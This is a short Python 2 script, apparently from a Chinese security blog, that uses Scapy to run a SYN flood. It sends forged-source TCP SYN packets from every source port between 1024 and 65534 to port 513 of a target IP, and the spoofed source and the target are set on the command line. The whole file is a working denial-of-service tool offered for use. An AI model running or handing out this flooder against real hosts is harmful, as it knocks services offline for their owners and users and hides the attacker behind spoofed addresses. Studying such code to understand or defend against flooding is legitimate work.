#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/18
# Created by 冰河
# Description 使用Scapy制造SYN泛洪攻击
#             实现很简单：制造一些载有TCP协议层的IP数据包，让这些包里TCP源端口不断自增一，目的TCP端口总是513
# 博客 https://blog.csdn.net/l1028386804

import optparse
from scapy.all import *

#实现scapy泛洪攻击
def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

def main():
    parser = optparse.OptionParser('usage%prog -s <source ip> -t <target ip>')
    parser.add_option('-s', dest='srcIP', type='string', help='specify source ip')
    parser.add_option('-t', dest='tarIP', type='string', help='specify target ip')
    (options, args) = parser.parse_args()
    srcIP = options.srcIP
    tarIP = options.tarIP
    if srcIP == None or tarIP == None:
        print parser.usage
        exit(0)
    synFlood(srcIP, tarIP)

if __name__ == '__main__':
    main()
